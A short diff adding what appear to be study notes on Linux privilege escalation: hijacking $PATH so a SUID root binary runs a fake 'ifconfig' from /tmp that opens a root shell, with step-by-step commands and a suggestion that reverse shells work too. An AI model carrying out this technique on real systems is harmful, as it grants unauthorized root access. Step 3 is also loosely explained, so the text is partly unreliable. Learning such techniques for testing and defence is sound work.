@@ -1,0 +1,10 @@
+A binary with a SUID or SGID set as root that makes calls to a binary through $PATH may be exploited. For examples:
+
+1) string <target binary> -> Shows us that this binary is making calls to 'ifconfig' through $PATH as its not using the full path to the binary of /usr/bin/ifconfig or w/e
+2) cd /tmp/ -> Navigate to tmp dir. This is where our malicious binary is created 
+3) echo /bin/bash > ifconfig -> copy the contents of /bin/bash into a file with the identical name as the binary being called by the suid binary
+4) export PATH=/tmp:/$PATH -> Prepend /tmp/ to $PATH. $PATH is read left>right
+5) Run the SUID binary. It will execute our "ifconfig" in /tmp/ which will contains contents of /bin/bash to open a shell. The SUID runs it as root
+6) Clean up $PATH w/: export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
+
+The point is we can take adv. of a SUID binary that calls an executable via $PATH. We can create rev. shells or w/e we like, name it the same as the executable being called, and run the SUID binary to run w/e we want as root
